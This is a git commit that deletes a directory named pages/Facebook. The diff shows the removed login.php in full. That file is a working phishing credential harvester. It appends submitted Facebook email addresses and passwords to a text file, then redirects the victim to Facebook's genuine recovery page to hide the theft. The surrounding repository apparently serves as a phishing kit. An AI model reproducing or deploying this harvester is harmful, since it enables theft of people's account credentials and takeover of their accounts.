7a4a58aebd3c12cfd4ca4830ac32d84ddf2e00c4
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2021-12-09 17:50:01 -0600

    Delete pages/Facebook directory

--- pages/Facebook/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usuarios.txt", "Usuario de Facebook: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
-exit();
-?>
